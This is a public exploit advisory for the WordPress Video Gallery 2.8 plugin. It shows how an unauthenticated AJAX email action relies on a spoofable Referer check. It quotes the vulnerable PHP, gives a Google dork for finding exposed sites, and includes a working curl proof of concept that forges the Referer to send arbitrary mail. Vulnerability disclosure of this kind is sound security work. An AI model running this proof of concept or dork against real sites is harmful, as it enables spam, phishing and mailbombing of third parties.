@@ -1,0 +1,118 @@
+﻿######################
+
+# Exploit Title : Wordpress Video Gallery 2.8 Unprotected Mail Page
+
+# Exploit Author : Claudio Viviani
+
+# Website Author: http://www.homelab.it
+                  http://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)
+
+# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery
+
+# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip
+
+# Dork Google: index of "contus-video-gallery"
+            
+
+# Date : 2015-04-05
+
+# Tested on : Windows 7 / Mozilla Firefox
+              Linux / Mozilla Firefox         
+
+######################
+
+# Description
+
+ Wordpress Video Gallery 2.8 suffers from Unprotected Mail Page.
+ 
+ This vulnerability is exploitable to dos, phishing, mailbombing, spam...
+ 
+ The "email" ajax action is callable from any guest visitor (/contus-video-gallery/hdflvvideoshare.php)
+ 
+  /**
+  * Email function
+  */
+ add_action( 'wp_ajax_email', 'email_function' );
+ add_action( 'wp_ajax_nopriv_email', 'email_function' );
+ 
+ function email_function() {
+     require_once( dirname( __FILE__ ) . '/email.php' );
+     die();
+ }
+
+ Any user can send email from /contus-video-gallery/email.php to any recipients.
+ 
+ The variables used to send emails are:
+ 
+ $to   = filter_input( INPUT_POST, 'to', FILTER_VALIDATE_EMAIL );
+ $from = filter_input( INPUT_POST, 'from', FILTER_VALIDATE_EMAIL );
+ $url  = filter_input( INPUT_POST, 'url', FILTER_VALIDATE_URL );
+ $subject  = filter_input( INPUT_POST, 'Note', FILTER_SANITIZE_STRING );
+ $message_content =  filter_input( INPUT_POST, 'Note', FILTER_SANITIZE_STRING );
+ $title    = filter_input( INPUT_POST, 'title', FILTER_SANITIZE_STRING );
+ $referrer = parse_url( $_SERVER['HTTP_REFERER'] );
+ $referrer_host = $referrer['scheme'] . '://' . $referrer['host'];
+ $pageURL  = 'http';
+ 
+ It assumes that if the provided “Referrer” field fits the website’s URL, then it’s okay to send this email:
+ 
+ if ( $referrer_host === $pageURL ) {
+     $headers = "MIME-Version: 1.0" . "\r\n";
+     $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";	
+     $headers .= "From: " . "<" . $from . ">\r\n";
+     $headers .= "Reply-To: " . $from . "\r\n";
+     $headers .= "Return-path: " . $from;
+     $username = explode('@' , $from );   
+     $username = ucfirst($username['0']);
+     $subject  =  $username . ' has shared a video with you.';
+     $emailtemplate_path  = plugin_dir_url( __FILE__ ).'front/emailtemplate/Emailtemplate.html';	
+     $message =  file_get_contents( $emailtemplate_path);
+     $message = str_replace( '{subject}', $subject, $message );
+     $message = str_replace( '{message}', $message_content, $message);
+     $message = str_replace( '{videourl}',$url,$message );
+     $message = str_replace('{username}',$username ,$message );
+     if ( @mail( $to, $title, $message, $headers ) ) {
+         echo 'success=sent';
+     } else {
+         echo 'success=error';
+     }
+ } else {
+     echo 'success=error';
+ }
+ 
+ The “Referer” field can easily be modified by the attacker!
+
+######################
+
+# PoC
+
+ curl -X POST -d "from=attacker@attacker.com&to=victim@victim.com&Note=BodyMessage&title=Subject&url=http://www.homelab.it" \
+ -e http://127.0.0.1 http://127.0.0.1/wp-admin/admin-ajax.php?action=email
+
+ cUrl switch "-e" spoof referer address
+
+# Http Response
+
+  success=sent 
+  
+# Poc Video
+
+http://youtu.be/qgOGPm1-tNc
+ 
+
+#######################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+                http://archive-exploit.homelab.it/1 (Full HomelabIT Archive Exploit)
+                http://ffhd.homelab.it (Free Fuzzy Hashes Database)
+				
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
